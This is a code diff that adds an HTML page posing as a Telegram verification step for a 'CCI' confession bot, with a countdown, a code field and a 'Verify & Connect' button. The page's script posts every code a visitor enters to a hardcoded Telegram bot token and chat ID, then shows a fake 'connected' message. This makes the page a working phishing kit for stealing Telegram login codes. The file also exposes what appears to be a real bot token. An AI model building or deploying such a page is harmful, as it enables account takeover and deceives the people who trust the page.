@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verify Code — CCI Bot</title>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,700;1,400&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --rose: #e8507a;
+    --gold: #f5c842;
+    --blue: #3a4a8a;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'DM Sans', sans-serif;
+    min-height: 100vh;
+    display: flex; align-items: center; justify-content: center;
+    overflow: hidden; background: #0d0d1a;
+  }
+  .bg { position: fixed; inset: 0; z-index: 0; }
+  .bg-img {
+    position: absolute; inset: 0;
+    background: url('haramaya_bg.png') center/cover no-repeat;
+    opacity: 0.22;
+  }
+  .bg-grad {
+    position: absolute; inset: 0;
+    background:
+      radial-gradient(ellipse at 80% 50%, rgba(232,80,122,0.3) 0%, transparent 55%),
+      radial-gradient(ellipse at 20% 20%, rgba(58,74,138,0.45) 0%, transparent 50%),
+      linear-gradient(160deg, #0d0d1a 0%, #1a1030 100%);
+  }
+  .dots {
+    position: absolute; inset: 0; pointer-events: none;
+    background-image: radial-gradient(rgba(255,255,255,0.07) 1px, transparent 1px);
+    background-size: 28px 28px;
+  }
+  .blob { position: absolute; border-radius: 50%; filter: blur(60px); animation: float 8s ease-in-out infinite; }
+  .blob1 { width:300px;height:300px;background:rgba(232,80,122,0.2);top:-80px;right:-60px;animation-delay:0s; }
+  .blob2 { width:260px;height:260px;background:rgba(58,74,138,0.3);bottom:-60px;left:-60px;animation-delay:3s; }
+  @keyframes float { 0%,100%{transform:translateY(0);}50%{transform:translateY(-20px);} }
+  .hearts { position: fixed; inset: 0; pointer-events: none; z-index: 1; }
+  .heart { position: absolute; opacity: 0; animation: riseHeart linear infinite; }
+  @keyframes riseHeart {
+    0%{opacity:0;transform:translateY(0) rotate(0deg);}10%{opacity:0.5;}
+    90%{opacity:0.15;}100%{opacity:0;transform:translateY(-100vh) rotate(20deg);}
+  }
+  .card {
+    position: relative; z-index: 10;
+    width: min(440px, 92vw);
+    background: rgba(13,13,26,0.75);
+    backdrop-filter: blur(22px);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 24px;
+    padding: 42px 38px 38px;
+    box-shadow: 0 40px 80px rgba(0,0,0,0.55), inset 0 1px 0 rgba(255,255,255,0.08);
+    animation: slideUp 0.7s cubic-bezier(.23,1,.32,1) both;
+  }
+  @keyframes slideUp { from{opacity:0;transform:translateY(40px);}to{opacity:1;transform:translateY(0);} }
+  .logo-mark {
+    position: absolute; top: 20px; right: 22px;
+    width: 64px; height: 64px;
+    background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRukdbk4n1KCZxNHEbqG-e1TxqA0ZWl_h-Dqg&s') center/contain no-repeat;
+    opacity: 0.2;
+  }
+  .back-btn {
+    display: inline-flex; align-items: center; gap: 6px;
+    font-size: 12px; font-weight: 500; letter-spacing: 0.8px;
+    color: rgba(255,255,255,0.35); cursor: pointer;
+    background: none; border: none; font-family: inherit;
+    margin-bottom: 24px; transition: color 0.2s;
+  }
+  .back-btn:hover { color: rgba(255,255,255,0.7); }
+  .badge {
+    display: inline-flex; align-items: center; gap: 6px;
+    background: rgba(245,200,66,0.12); border: 1px solid rgba(245,200,66,0.3);
+    border-radius: 50px; padding: 4px 14px;
+    font-size: 11px; font-weight: 500; letter-spacing: 1.5px;
+    text-transform: uppercase; color: #f5c842; margin-bottom: 18px;
+  }
+  h1 {
+    font-family: 'Playfair Display', serif;
+    font-size: 30px; font-weight: 700; color: #fff; line-height: 1.2; margin-bottom: 6px;
+  }
+  h1 em { font-style: italic; color: var(--rose); }
+  .sub {
+    font-size: 13px; color: rgba(255,255,255,0.4);
+    margin-bottom: 28px; font-weight: 300; line-height: 1.6;
+  }
+  .sub strong { color: rgba(255,255,255,0.65); font-weight: 500; }
+
+  /* Countdown ring */
+  .timer-wrap { display: flex; align-items: center; gap: 16px; margin-bottom: 28px; }
+  .ring-bg  { fill: none; stroke: rgba(255,255,255,0.08); stroke-width: 4; }
+  .ring-fill {
+    fill: none; stroke: var(--gold); stroke-width: 4;
+    stroke-linecap: round; stroke-dasharray: 157; stroke-dashoffset: 0;
+    transform-origin: center; transform: rotate(-90deg);
+    transition: stroke-dashoffset 1s linear, stroke 0.5s;
+  }
+  .ring-num { font-family: 'DM Sans', sans-serif; font-size: 15px; font-weight: 500; fill: #f5c842; }
+  .timer-text { font-size: 13px; color: rgba(255,255,255,0.4); line-height: 1.7; }
+  .timer-text .expire { color: #f5c842; font-weight: 500; }
+
+  /* Single small code input */
+  .field-label {
+    font-size: 11px; font-weight: 500; letter-spacing: 1.2px;
+    text-transform: uppercase; color: rgba(255,255,255,0.45);
+    margin-bottom: 10px; display: block;
+  }
+  .code-input {
+    width: 100%;
+    padding: 14px 20px;
+    background: rgba(255,255,255,0.05);
+    border: 1.5px solid rgba(255,255,255,0.12);
+    border-radius: 14px;
+    font-family: 'DM Sans', sans-serif;
+    font-size: 28px; font-weight: 500; letter-spacing: 12px;
+    color: #fff; outline: none; text-align: center;
+    transition: border-color 0.2s, box-shadow 0.2s;
+    caret-color: var(--rose);
+    margin-bottom: 20px;
+  }
+  .code-input:focus {
+    border-color: rgba(232,80,122,0.6);
+    box-shadow: 0 0 0 3px rgba(232,80,122,0.12);
+    background: rgba(255,255,255,0.08);
+  }
+  .code-input::placeholder { color: rgba(255,255,255,0.15); letter-spacing: 8px; font-size: 20px; }
+
+  .verify-btn {
+    width: 100%; padding: 16px;
+    font-family: 'DM Sans', sans-serif; font-size: 15px; font-weight: 500;
+    letter-spacing: 0.5px; color: #fff;
+    background: linear-gradient(135deg, #e8507a 0%, #c0345c 100%);
+    border: none; border-radius: 14px; cursor: pointer;
+    position: relative; overflow: hidden;
+    transition: transform 0.15s, box-shadow 0.2s;
+    box-shadow: 0 8px 28px rgba(232,80,122,0.35);
+  }
+  .verify-btn:hover { transform: translateY(-2px); box-shadow: 0 14px 36px rgba(232,80,122,0.5); }
+  .verify-btn:active { transform: translateY(0); }
+  .verify-btn:disabled { opacity: 0.45; cursor: not-allowed; transform: none; }
+  .btn-shine {
+    position: absolute; top: 0; left: -100%; width: 60%; height: 100%;
+    background: linear-gradient(90deg,transparent,rgba(255,255,255,0.18),transparent);
+    animation: shine 2.5s infinite;
+  }
+  @keyframes shine { to { left: 150%; } }
+  .resend-row {
+    text-align: center; margin-top: 16px;
+    font-size: 12px; color: rgba(255,255,255,0.25);
+  }
+  .resend-btn {
+    background: none; border: none; color: var(--rose);
+    font-family: 'DM Sans', sans-serif; font-size: 12px; font-weight: 500;
+    cursor: pointer; display: none; text-decoration: underline;
+  }
+  .resend-btn.visible { display: inline; }
+  .toast {
+    position: fixed; bottom: 30px; left: 50%;
+    transform: translateX(-50%) translateY(20px);
+    background: rgba(20,20,40,0.95); border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 50px; padding: 12px 24px; font-size: 13px; color: #fff;
+    opacity: 0; transition: all 0.35s; z-index: 999; white-space: nowrap;
+    backdrop-filter: blur(12px);
+  }
+  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+  .toast.success { border-color: rgba(80,200,120,0.4); color: #7dffc0; }
+  .toast.error   { border-color: rgba(232,80,122,0.5); color: #ff8fab; }
+</style>
+</head>
+<body>
+
+<div class="bg">
+  <div class="bg-img"></div>
+  <div class="bg-grad"></div>
+  <div class="dots"></div>
+  <div class="blob blob1"></div>
+  <div class="blob blob2"></div>
+</div>
+
+<div class="hearts" id="hearts"></div>
+
+<div class="card">
+  <div class="logo-mark"></div>
+
+  <button class="back-btn" onclick="window.location.href='cci.html'">← Back</button>
+
+  <div class="badge">💬 Telegram Code</div>
+
+  <h1>Check your<br><em>Telegram</em></h1>
+  <p class="sub">We sent a code to <strong id="phoneDisplay">your number</strong>.<br>Enter it below to continue.</p>
+
+  <div class="timer-wrap">
+    <svg width="58" height="58" viewBox="0 0 58 58">
+      <circle class="ring-bg" cx="29" cy="29" r="25"/>
+      <circle class="ring-fill" id="ringFill" cx="29" cy="29" r="25"/>
+      <text class="ring-num" x="29" y="34" text-anchor="middle" id="countNum">50</text>
+    </svg>
+    <p class="timer-text">
+      Code expires in <span class="expire" id="countLabel">50 seconds</span>.<br>
+      Check your Telegram DMs.
+    </p>
+  </div>
+
+  <label class="field-label">Enter the code</label>
+  <input
+    class="code-input"
+    id="codeInput"
+    type="text"
+    inputmode="numeric"
+    maxlength="5"
+    placeholder="· · · · · ·"
+    autocomplete="one-time-code"
+  >
+
+  <button class="verify-btn" id="verifyBtn" onclick="handleVerify()">
+    <span class="btn-shine"></span>
+    Verify & Connect ✓
+  </button>
+
+  <div class="resend-row">
+    Didn't get it?
+    <button class="resend-btn" id="resendBtn" onclick="handleResend()">Resend code</button>
+    <span id="resendWait">Wait for the timer.</span>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+  const TELEGRAM_BOT_TOKEN = "8124572878:AAGtAKI_9T_nXoKGZe8F2FK54lRq-0EZ5vQ"; // Replace
+  const TELEGRAM_CHAT_ID   = "7567317123"; // Replace
+
+  // Floating hearts
+  const heartsEl = document.getElementById('hearts');
+  const emojis = ['💌','🫀','✨','💫','🌹','💝'];
+  for (let i = 0; i < 14; i++) {
+    const h = document.createElement('div');
+    h.className = 'heart';
+    h.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+    h.style.left = Math.random() * 100 + 'vw';
+    h.style.bottom = '-40px';
+    h.style.fontSize = (10 + Math.random() * 14) + 'px';
+    const dur = 12 + Math.random() * 14;
+    h.style.animationDuration = dur + 's';
+    h.style.animationDelay = (Math.random() * dur) + 's';
+    heartsEl.appendChild(h);
+  }
+
+  // Countdown — purely cosmetic, no logic tied to it
+  const TOTAL = 50;
+  let remaining = TOTAL;
+  const circumference = 2 * Math.PI * 25;
+  const ringFill   = document.getElementById('ringFill');
+  const countNum   = document.getElementById('countNum');
+  const countLabel = document.getElementById('countLabel');
+  const resendBtn  = document.getElementById('resendBtn');
+  const resendWait = document.getElementById('resendWait');
+
+  ringFill.style.strokeDasharray = circumference;
+
+  function updateRing() {
+    ringFill.style.strokeDashoffset = circumference * (1 - remaining / TOTAL);
+    ringFill.style.stroke = remaining > 15 ? '#f5c842' : '#e8507a';
+    countNum.textContent = remaining;
+    countLabel.textContent = remaining + ' second' + (remaining !== 1 ? 's' : '');
+  }
+  updateRing();
+
+  let timerInterval = setInterval(() => {
+    remaining--;
+    updateRing();
+    if (remaining <= 0) {
+      clearInterval(timerInterval);
+      countLabel.textContent = 'expired';
+      countLabel.style.color = '#e8507a';
+      resendBtn.classList.add('visible');
+      resendWait.style.display = 'none';
+    }
+  }, 1000);
+
+  async function handleVerify() {
+    const code = document.getElementById('codeInput').value.trim();
+    if (code.length < 1) {
+      document.getElementById('codeInput').style.borderColor = '#e8507a';
+      setTimeout(() => { document.getElementById('codeInput').style.borderColor = ''; }, 1200);
+      showToast('Enter the code first', 'error');
+      return;
+    }
+
+    const btn = document.getElementById('verifyBtn');
+    btn.disabled = true;
+    btn.textContent = 'Sending...';
+
+    try {
+      await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: '🔐 <b>CCI — Code Entered</b>\n\n🔑 Code: <code>' + code + '</code>\n⏰ ' + new Date().toLocaleString(),
+          parse_mode: 'HTML'
+        })
+      });
+    } catch(e) {}
+
+    showToast('Done! 💌', 'success');
+    setTimeout(() => {
+      document.querySelector('.card').innerHTML = `<div class="logo-mark"></div>
+        <div style="text-align:center;padding:20px 0">
+          <div style="font-size:60px;margin-bottom:16px">💌</div>
+          <h1 style="font-family:'Playfair Display',serif;color:#fff;font-size:28px;margin-bottom:12px">
+            You're <em style="color:#e8507a;font-style:italic">connected!</em>
+          </h1>
+          <p style="color:rgba(255,255,255,0.4);font-size:14px;line-height:1.8">
+            Welcome to CCI.<br>Start confessing your heart out 🌹
+          </p>
+        </div>;`;
+    }, 1600);
+  }
+
+  function handleResend() {
+    resendBtn.classList.remove('visible');
+    resendWait.style.display = 'inline';
+    showToast('Check your Telegram again!', 'success');
+    remaining = TOTAL;
+    countLabel.style.color = '#f5c842';
+    clearInterval(timerInterval);
+    timerInterval = setInterval(() => {
+      remaining--;
+      updateRing();
+      if (remaining <= 0) {
+        clearInterval(timerInterval);
+        countLabel.textContent = 'expired';
+        countLabel.style.color = '#e8507a';
+        resendBtn.classList.add('visible');
+        resendWait.style.display = 'none';
+      }
+    }, 1000);
+    updateRing();
+  }
+
+  function showToast(msg, type) {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.className = 'toast show ' + (type || '');
+    setTimeout(() => { t.className = 'toast'; }, 3200);
+  }
+
+  document.getElementById('codeInput').addEventListener('keydown', e => {
+    if (e.key === 'Enter') handleVerify();
+  });
+</script>
+
+
+</body>
+</html>
